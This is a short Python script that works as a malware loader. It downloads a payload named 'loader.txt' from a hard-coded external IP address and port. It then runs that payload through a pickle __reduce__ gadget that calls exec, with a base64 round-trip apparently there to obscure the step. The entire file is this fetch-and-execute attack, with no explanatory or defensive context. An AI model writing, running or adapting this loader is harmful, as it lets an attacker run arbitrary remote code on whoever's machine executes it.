#-*- coding : utf-8-*-
#coding:unicode_escape
import pickle
import ctypes,urllib.request,codecs,base64
sectr = urllib.request.urlopen('http://1.15.134.154:8088/loader.txt').read()
#sectr=str(sectr,'UTF-8')
#print(sectr)
#sectr = base64.b64decode(sectr).decode("utf-8")
class A(object):
    def __reduce__(self):
        return (exec, (sectr,))
ret = pickle.dumps(A())
ret_base64 = base64.b64encode(ret)
ret_decode = base64.b64decode(ret_base64)
pickle.loads(ret_decode)